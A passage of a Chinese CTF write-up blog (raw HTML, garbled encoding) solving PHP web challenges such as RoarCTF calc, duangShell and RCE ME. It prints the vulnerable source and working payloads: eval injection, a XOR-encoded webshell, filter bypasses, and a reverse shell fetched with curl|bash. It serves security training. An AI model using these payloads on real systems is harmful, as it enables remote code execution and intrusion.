&#125;,</span><br><span class="line">            error:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">                alert(<span class="string">&quot;è¿™å•¥?ç®—ä¸æ¥!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>è®¿é—®<code>calc.php</code>ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $str = $_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    $blacklist = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . $blackitem . <span class="string">&#x27;/m&#x27;</span>, $str)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.$str.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>ç¬¬13è¡Œ<code>eval</code>å¯ä»¥æ‰§è¡ŒPHPä»£ç ï¼Œæµ‹è¯•å‘ç°<code>num</code>å‚æ•°ä¸èƒ½è¾“å…¥éæ•°å­—çš„å€¼ï¼Œå¦åˆ™ä¼šç›´æ¥500ã€‚</p>
<p>payloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">calc.php?%20num&#x3D;phpinfo()</span><br></pre></td></tr></table></figure>
<blockquote>
<p>ä¾‹å¦‚ï¼š/?foo=barå˜æˆArray([foo] =&gt; â€œbarâ€)ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼ŒæŸ¥è¯¢å­—ç¬¦ä¸²åœ¨è§£æçš„è¿‡ç¨‹ä¸­ä¼šå°†æŸäº›å­—ç¬¦åˆ é™¤æˆ–ç”¨ä¸‹åˆ’çº¿ä»£æ›¿ã€‚ä¾‹å¦‚ï¼Œ/?%20news[id%00=42ä¼šè½¬æ¢ä¸ºArray([news_id] =&gt; 42)ã€‚</p>
</blockquote>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200619120244.png" alt=""></p>
<p>ä»£ç ä¸­è¿‡æ»¤äº†<code>/</code>ï¼Œç”¨<code>chr</code>ç»•è¿‡ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;node3.buuoj.cn:26901&#x2F;calc.php?%20num&#x3D;var_dump(scandir(chr(47)))</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200619122312.png" alt=""></p>
<p>è¯»å–<code>/f1agg</code>ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;node3.buuoj.cn:26901&#x2F;calc.php?%20num&#x3D;readfile(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</span><br></pre></td></tr></table></figure>
<h2 id="watevrCTF-2019-Supercalc">watevrCTF-2019 Supercalc</h2>
<h3 id="TODO-v3">TODO</h3>
<h2 id="RCTF2019-calcalcalc">RCTF2019 calcalcalc</h2>
<h3 id="TODO-v4">TODO</h3>
<h2 id="De1CTF-2019-9calc">De1CTF 2019 9calc</h2>
<h3 id="TODO-v5">TODO</h3>
<h2 id="GXYCTF2019-ç¦æ­¢å¥—å¨ƒ">GXYCTF2019 ç¦æ­¢å¥—å¨ƒ</h2>
<h3 id="è€ƒç‚¹-v4">è€ƒç‚¹</h3>
<ul>
<li>Gitæºç æ³„éœ²</li>
<li>æ— å‚æ•°webshell</li>
</ul>
<h3 id="è§£é¢˜-v4">è§£é¢˜</h3>
<p>dirmapæ‰«æå‘ç°æœ‰Gitç›®å½•ï¼Œç”¨GitHack downloadä¸‹æ¥ï¼Œå®¡è®¡ä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;exp&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z,_]+\((?R)?\)/&#x27;</span>, <span class="literal">NULL</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, $_GET[<span class="string">&#x27;exp&#x27;</span>])) &#123;</span><br><span class="line">                <span class="comment">// echo $_GET[&#x27;exp&#x27;];</span></span><br><span class="line">                @<span class="keyword">eval</span>($_GET[<span class="string">&#x27;exp&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;è¿˜å·®ä¸€ç‚¹å“¦ï¼&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;å†å¥½å¥½æƒ³æƒ³ï¼&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>è¿™ä¸ªæ­£åˆ™è¡¨è¾¾å¼<code>/[a-z,_]+\((?R)?\)/</code>å¾ˆæ˜æ˜¾æ˜¯æ— å‚æ•°webshellï¼Œç›´æ¥ä¸ŠpayloadæŸ¥çœ‹å½“å‰è·¯å¾„ä¸‹çš„æ–‡ä»¶ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?exp&#x3D;var_dump(scandir(pos(localeconv())));</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200702000024.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">readfile(array_rand(array_flip(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>
<blockquote>
<p>array_rand()    å‡½æ•°è¿”å›æ•°ç»„ä¸­çš„éšæœºé”®åï¼Œæˆ–è€…å¦‚æœæ‚¨è§„å®šå‡½æ•°è¿”å›ä¸åªä¸€ä¸ªé”®åï¼Œåˆ™è¿”å›åŒ…å«éšæœºé”®åçš„æ•°ç»„ã€‚<br>
array_flip()    array_flip() å‡½æ•°ç”¨äºåè½¬/äº¤æ¢æ•°ç»„ä¸­æ‰€æœ‰çš„é”®åä»¥åŠå®ƒä»¬å…³è”çš„é”®å€¼ã€‚</p>
</blockquote>
<p>å½“ç„¶ï¼Œè¿˜å¯ä»¥å†™headerå­—æ®µï¼Œç„¶åç”¨get_all_header()å‡½æ•°è·å¾—<code>flag.php</code>æ–‡ä»¶ã€‚</p>
<h2 id="BJDCTF-2nd-duangShell">BJDCTF 2nd duangShell</h2>
<h3 id="è€ƒç‚¹-v5">è€ƒç‚¹</h3>
<ul>
<li>swpæ–‡ä»¶æ³„éœ²</li>
<li>åå¼¹shell</li>
</ul>
<h3 id="è§£é¢˜-v5">è§£é¢˜</h3>
<p>æ‰“å¼€é¢˜ç›®æç¤ºswpæ–‡ä»¶æ³„éœ²ï¼Œè®¿é—®<code>.index.php.swp</code>ä¸‹è½½æ–‡ä»¶ï¼Œ<code>vim -r index.php.swp</code>æ¢å¤æ–‡ä»¶ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;give me a girl&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;center&gt;&lt;h1&gt;ççˆ±ç½‘&lt;/h1&gt;&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;how can i give you source code? .swp?!&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">&#x27;girl_friend&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;where is P3rh4ps&#x27;s girl friend ???&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $girl = $_POST[<span class="string">&#x27;girl_friend&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/\&gt;|\\\/&#x27;</span>, $girl)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;just girl&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$/i&#x27;</span>, $girl)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;img/p3_need_beautiful_gf.png&#x27;&gt; &lt;!-- He is p3 --&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//duangShell~~~~</span></span><br><span class="line">        exec($girl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è§‚å¯Ÿæºä»£ç ä¹‹åå‘ç°æ˜¯ç»•è¿‡è¿‡æ»¤ä¹‹åå‘½ä»¤æ‰§è¡Œçš„é¢˜ç›®ã€‚</p>
<p>å› ä¸ºè¿‡æ»¤äº†$ç¬¦å·ï¼Œæ‰€ä»¥ä¸èƒ½é‡‡ç”¨è¿™ç§é»‘åå•æ‹¼æ¥çš„æ–¹å¼ç»•è¿‡</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a&#x3D;ca;b&#x3D;t;c&#x3D;flag;&#96;&#96;$ab&#96; &#96;$c</span><br></pre></td></tr></table></figure>
<p>ç¦ç”¨äº†base64ä¹‹åä¸èƒ½ä½¿ç”¨base64ç¼–ç ç»•è¿‡</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;Y2F0IGZsYWc&#x3D;&quot; | base64 -d</span><br></pre></td></tr></table></figure>
<p>è€Œä¸”exec()å‡½æ•°æ˜¯æ²¡æœ‰å›æ˜¾çš„ï¼Œåˆæƒ³äº†ä¸€äº›å¥‡æ€ªçš„å§¿åŠ¿ï¼Œç€å®ä¸è¡Œï¼Œçœ‹å¸ˆå‚…ä»¬çš„åšå®¢å§ã€‚</p>
<p>è¿™é“é¢˜ç”¨åˆ°çš„æ˜¯åå¼¹shellï¼Œå…ˆç”¨å°å·å¼€ä¸€ä¸ªLinuxé¶æœºï¼Œç”¨SSHç™»å½•ä¸Šå»ï¼ŒæŸ¥çœ‹ipåœ°å€ã€‚</p>
<p>åœ¨<code>/var/www/html/re_shell.txt</code>å†™å…¥åå¼¹shellå‘½ä»¤ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;[ip]&#x2F;[port] 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
<p>å†ç›‘å¬æœ¬åœ°çš„å¯¹åº”ç«¯å£ï¼Œåœ¨é¶æœºä¸Šè®¿é—®</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">girl_friend&#x3D;curl http:&#x2F;&#x2F;[ip]&#x2F;[æ–‡ä»¶å]|bash</span><br></pre></td></tr></table></figure>
<p>æœ¬æœºè·å¾—shellåï¼ŒæŸ¥æ‰¾flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -name *flag*</span><br></pre></td></tr></table></figure>
<h2 id="æå®¢å¤§æŒ‘æˆ˜2019-RCE-ME">æå®¢å¤§æŒ‘æˆ˜2019 RCE ME</h2>
<h3 id="è€ƒç‚¹-v6">è€ƒç‚¹</h3>
<ul>
<li>æ— æ•°å­—å­—æ¯çš„webshell</li>
<li>disable_functionç»•è¿‡</li>
</ul>
<h3 id="è§£é¢˜-v6">è§£é¢˜</h3>
<p>å®¡è®¡ä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">            $code=$_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">                    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;This is too Long.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,$code))&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">            highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>è¿™ä¸ªçŸ¥è¯†ç‚¹éƒ½è¦è€ƒçƒ‚äº†ï¼Œå…ˆç”¨phpinfoéªŒè¯ä¸€ä¸‹ï¼Œç›´æ¥ç»™payloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?code&#x3D;$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86&#x3D;phpinfo</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200706133157.png" alt=""></p>
<p>å…ˆæ„é€ ä¸€ä¸ªshellï¼Œç”¨èšå‰‘è¿æ¥</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?code&#x3D;$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;[_]($&#123;%86%86%86%86^%d9%c1%c3%d2&#125;[__]);&amp;_&#x3D;assert&amp;__&#x3D;eval($_POST[%27a%27])</span><br></pre></td></tr></table></figure>
<blockquote>
<p>PHP7.0 è¿˜å¯ä»¥ä½¿ç”¨assertæ¥æ‰§è¡Œphpè¯­å¥ï¼ŒPHP7.1ä¹‹åå°±ä¸è¡Œäº†ã€‚</p>
</blockquote>
<p>ç„¶åå†åŠ è½½<a href="https://github.com/Medicean/as_bypass_php_disable_functions">ç»•è¿‡disable_functionçš„æ’ä»¶</a>ï¼Œè¿è¡Œreadflagå³å¯ã€‚</p>
<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200706135436.png" style="zoom:67%;" />
<h2 id="WUSTCTF2020-æœ´å®æ— å">WUSTCTF2020 æœ´å®æ— å</h2>
<h3 id="è€ƒç‚¹-v7">è€ƒç‚¹</h3>
<ul>
<li>intvalå‡½æ•°ç»•è¿‡</li>
<li>md5å¼±ç±»å‹</li>
<li>Linuxå‘½ä»¤ç©ºæ ¼å’Œcatç»•è¿‡</li>
</ul>
<h3 id="è§£é¢˜-v7">è§£é¢˜</h3>
<p>æ ¹æ®hintè®¿é—®<code>fl4g.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__file__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//level 1</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    $num = $_GET[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(intval($num) &lt; <span class="number">2020</span> &amp;&amp; intval($num + <span class="number">1</span>) &gt; <span class="number">2021</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;æˆ‘ä¸ç»æ„é—´çœ‹äº†çœ‹æˆ‘çš„åŠ³åŠ›å£«, ä¸æ˜¯æƒ³çœ‹æ—¶é—´, åªæ˜¯æƒ³ä¸ç»æ„é—´, è®©ä½ çŸ¥é“æˆ‘è¿‡å¾—æ¯”ä½ å¥½.&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;é‡‘é’±è§£å†³ä¸äº†ç©·äººçš„æœ¬è´¨é—®é¢˜&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;å»éæ´²å§&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//level 2</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;md5&#x27;</span>]))&#123;</span><br><span class="line">   $md5=$_GET[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line">   <span class="keyword">if</span> ($md5==md5($md5))</span><br><span class="line">       <span class="keyword">echo</span> <span class="string">&quot;æƒ³åˆ°è¿™ä¸ªCTFeræ‹¿åˆ°flagå, æ„Ÿæ¿€æ¶•é›¶, è·‘å»ä¸œæ¾œå²¸, æ‰¾ä¸€å®¶é¤å…, æŠŠå¨å¸ˆè½°å‡ºå», è‡ªå·±ç‚’ä¸¤ä¸ªæ‹¿æ‰‹å°èœ, å€’ä¸€æ¯æ•£è£…ç™½é…’, è‡´å¯Œæœ‰é“, åˆ«å­¦å°æš´.&lt;/br&gt;&quot;</span>;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">       <span class="keyword">die</span>(<span class="string">&quot;æˆ‘èµ¶ç´§å–Šæ¥æˆ‘çš„é…’è‚‰æœ‹å‹, ä»–æ‰“äº†ä¸ªç”µè¯, æŠŠä»–ä¸€å®¶å®‰æ’åˆ°äº†éæ´²&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;å»éæ´²å§&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//get flag</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;get_flag&#x27;</span>]))&#123;</span><br><span class="line">    $get_flag = $_GET[<span class="string">&#x27;get_flag&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!strstr($get_flag,<span class="string">&quot; &quot;</span>))&#123;</span><br><span class="line">        $get_flag = str_ireplace(<span class="string">&quot;cat&quot;</span>, <span class="string">&quot;wctf2020&quot;</span>, $get_flag);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;æƒ³åˆ°è¿™é‡Œ, æˆ‘å……å®è€Œæ¬£æ…°, æœ‰é’±äººçš„å¿«ä¹å¾€å¾€å°±æ˜¯è¿™ä¹ˆçš„æœ´å®æ— å, ä¸”æ¯ç‡¥.&lt;/br&gt;&quot;</span>;</span><br><span class="line">        system($get_flag);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;å¿«åˆ°éæ´²äº†&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;å»éæ´²å§&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>å¥—å¨ƒé¢˜ï¼Œä¸€å±‚ä¸€å±‚çš„æ¥çœ‹ã€‚</p>
<p>ç¬¬ä¸€å±‚æ˜¯ç”¨ç§‘å­¦è®¡æ•°æ³•ç»•è¿‡intvalå‡½æ•°çš„ifåˆ¤æ–­ï¼Œç»™ä¸€ä¸ªdemo</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">&quot;3e4&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> intval($a);</span><br><span class="line"><span class="comment">// 3</span></span><br><span class="line"></span><br><span class="line">$b=<span class="string">&quot;3e4&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> intval($b+<span class="number">1</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">// 30001</span></span><br></pre></td></tr></table></figure>
<p>è¿™æ˜¯å› ä¸ºè¿›è¡Œ+1æ“ä½œçš„æ—¶å€™ä¼šå…ˆå°†$açš„ç§‘å­¦è®¡æ•°æ³•è§£æç„¶åå†åŠ 1ã€‚</p>
<blockquote>
<p>ä»¥ä¸‹åªé€‚åˆphp7.0åŠä»¥ä¸‹ç‰ˆæœ¬</p>
</blockquote>
<p>ç¬¬äºŒå±‚æ˜¯md5çš„å¼±æ¯”è¾ƒ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0e215962017</span><br><span class="line">md5å€¼ï¼š0e291242476940776845150308577824</span><br><span class="line">0e2159620</span><br><span class="line">md5å€¼ï¼š0e2159620</span><br></pre></td></tr></table></figure>
<p>ç¬¬ä¸‰å±‚æ˜¯ç»•è¿‡ç©ºæ ¼å’Œcatå‘½ä»¤ï¼Œç©ºæ ¼çš„ä»£æ›¿æ–¹å¼<code>$&#123;IFS&#125;</code>ã€<code>$IFS</code>ï¼Œcatçš„ä»£æ›¿æ–¹å¼<code>ca\t</code>ã€<code>sort</code>ã€<code>more</code>ç­‰ç­‰ã€‚</p>
<h2 id="CISCN2019-ååŒ—èµ›åŒº-love-math">CISCN2019 ååŒ—èµ›åŒº love math</h2>
<h3 id="è€ƒç‚¹-v8">è€ƒç‚¹</h3>
<ul>
<li>ä»£ç å®¡è®¡</li>
</ul>
<h3 id="è§£é¢˜-v8">è§£é¢˜</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//ä¾‹å­ c=20-1</span></span><br><span class="line">    $content = $_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;å¤ªé•¿äº†ä¸ä¼šç®—&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . $blackitem . <span class="string">&#x27;/m&#x27;</span>, $content)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    $whitelist = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    preg_match_all(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, $content, $used_funcs);  </span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&quot;</span>);</span><br><span class="line">        &#125;</span><br><span 